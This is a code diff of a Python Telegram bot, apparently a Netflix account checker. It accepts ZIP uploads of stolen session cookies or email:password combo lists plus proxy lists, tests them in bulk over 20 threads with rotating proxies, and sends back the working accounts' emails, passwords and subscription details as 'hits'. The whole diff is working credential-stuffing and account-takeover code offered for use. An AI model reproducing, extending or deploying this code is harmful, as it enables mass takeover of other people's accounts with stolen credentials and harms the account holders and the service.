@@ -253,4 +253,101 @@ def save_key(message):
 
 @bot.message_handler(func=lambda m: m.text in ["🍪 Cookie Mode (ZIP)", "🔑 Combo Mode (ZIP)"])
 def select_mode(message):
-    mode = "cookie" if "Cookie" in message
+    mode = "cookie" if "Cookie" in message.text else "combo"
+    user_mode[message.chat.id] = mode
+    bot.reply_to(message, f"📤 Send ZIP file for **{mode.upper()}** mode")
+
+@bot.message_handler(content_types=['document'])
+def handle_zip(message):
+    if not message.document.file_name.lower().endswith('.zip'):
+        bot.reply_to(message, "❌ Please send a .zip file")
+        return
+
+    bot.reply_to(message, "✅ ZIP received. Downloading large file... (this may take a few seconds)")
+
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
+
+        with tempfile.TemporaryDirectory() as tmp:
+            zip_path = os.path.join(tmp, "input.zip")
+            with requests.get(file_url, stream=True, timeout=(15, 360)) as response:
+                response.raise_for_status()
+                with open(zip_path, 'wb') as f:
+                    shutil.copyfileobj(response.raw, f, length=256*1024)
+
+            extract_dir = os.path.join(tmp, "cookies")
+            os.makedirs(extract_dir, exist_ok=True)
+            with zipfile.ZipFile(zip_path, 'r') as z:
+                z.extractall(extract_dir)
+
+            mode = user_mode.get(message.chat.id, "cookie")
+
+            if mode == "cookie":
+                checker = NetflixBulkChecker(threads=20)          # ← Faster (20 threads)
+                checker.chat_id = str(message.chat.id)
+                checker.start(extract_dir)
+            else:  # Combo Mode
+                if not API_KEY:
+                    bot.reply_to(message, "❌ Set API Key first with /setkey")
+                    return
+                combo_file = proxy_file = None
+                for f in os.listdir(extract_dir):
+                    if f.lower().endswith('.txt'):
+                        path = os.path.join(extract_dir, f)
+                        with open(path, 'r', encoding='utf-8', errors='ignore') as ff:
+                            content = ff.read(1000)
+                        if any(':' in line for line in content.splitlines() if line.strip()):
+                            combo_file = path
+                        else:
+                            proxy_file = path
+                if not combo_file or not proxy_file:
+                    bot.reply_to(message, "❌ ZIP must contain one combo file and one proxy file")
+                    return
+
+                checker = ComboChecker()
+                accounts = []
+                with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    for line in f:
+                        if ':' in line:
+                            email, pw = line.strip().split(':', 1)
+                            accounts.append({"email": email, "password": pw})
+                proxies = [line.strip() for line in open(proxy_file, 'r', encoding='utf-8', errors='ignore') if line.strip() and not line.startswith('#')]
+
+                with ThreadPoolExecutor(max_workers=20) as exe:     # ← Faster (20 threads)
+                    for acc in accounts:
+                        proxy = random.choice(proxies) if proxies else None
+                        result = checker.check_account(acc['email'], acc['password'], proxy)
+                        if result and result.get("status") == "hit":
+                            os.makedirs('hits', exist_ok=True)
+                            fname = f"[COMBO] [{acc['email']}] - HIT.txt"
+                            with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
+                                f.write(f"Email: {acc['email']}\n")
+                                f.write(f"Password: {acc['password']}\n")
+                                if result.get("subscription_details"):
+                                    for k, v in result["subscription_details"].items():
+                                        f.write(f"{k}: {v}\n")
+                                f.write("\nchecked by @Nf_premium_checker_bot\n")
+                                f.write("Bot Made by @Sudhakaran12\n")
+
+            if os.path.exists("hits") and os.listdir("hits"):
+                hits_zip = os.path.join(tmp, "hits.zip")
+                with zipfile.ZipFile(hits_zip, 'w') as z:
+                    for root, _, fs in os.walk("hits"):
+                        for file in fs:
+                            z.write(os.path.join(root, file), file)
+                with open(hits_zip, "rb") as f:
+                    bot.send_document(message.chat.id, f, caption="🎉 All Hits Saved with Full Cookie!")
+                shutil.rmtree("hits", ignore_errors=True)
+            else:
+                bot.reply_to(message, "❌ No hits found.")
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error processing ZIP: {str(e)[:400]}")
+
+    user_mode.pop(message.chat.id, None)
+
+if __name__ == "__main__":
+    print("🚀 Netflix Cookie + Combo Bot Started Successfully (FAST MODE)")
+    bot.remove_webhook()
+    bot.infinity_polling(skip_pending=True)
